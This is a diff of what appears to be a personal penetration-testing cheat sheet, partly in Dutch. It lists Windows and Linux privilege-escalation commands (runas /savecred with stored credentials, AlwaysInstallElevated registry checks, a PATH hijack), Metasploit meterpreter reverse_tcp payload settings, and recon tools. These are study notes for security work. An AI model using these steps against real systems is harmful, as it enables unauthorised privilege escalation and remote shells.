@@ -1,26 +1,21 @@
 # stuff to try and then put on a "correct" place in the step_by_Step
 
+
+# windows
 cmdkey /list
 runas /savecred /user:{usernamefromcmdkeylist} cmd.exe
 
+schtasks /query /fo list /v
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+# linux
 getcap -r / 2>/dev/null
 beetje als gtfobins
 
 path exploit
 export PATH=/tmp:$PATH
 nano "/bin/bash">/tmp/{foundnameofsomethingthatexecutesabinarywithpriviliges}
-
-ssrf:
-requestbin.com
-
-{url}/robots.txt
-crt.sh
-sublister
-
-pestudio
-procexp
-procmon
-cff explorer
 
 msfconsole
 systemctl start postgresql
@@ -36,6 +31,21 @@ set payload linux/x86/meterpreter/reverse_tcp
 set lhost {ip}
 set lport 4444
 ctrl+z #session in the background to use for later
+
+# tools
+
+ssrf:
+requestbin.com
+
+{url}/robots.txt
+crt.sh
+sublister
+
+pestudio
+procexp
+procmon
+cff explorer
+
 
 kerbrute
 go witnes
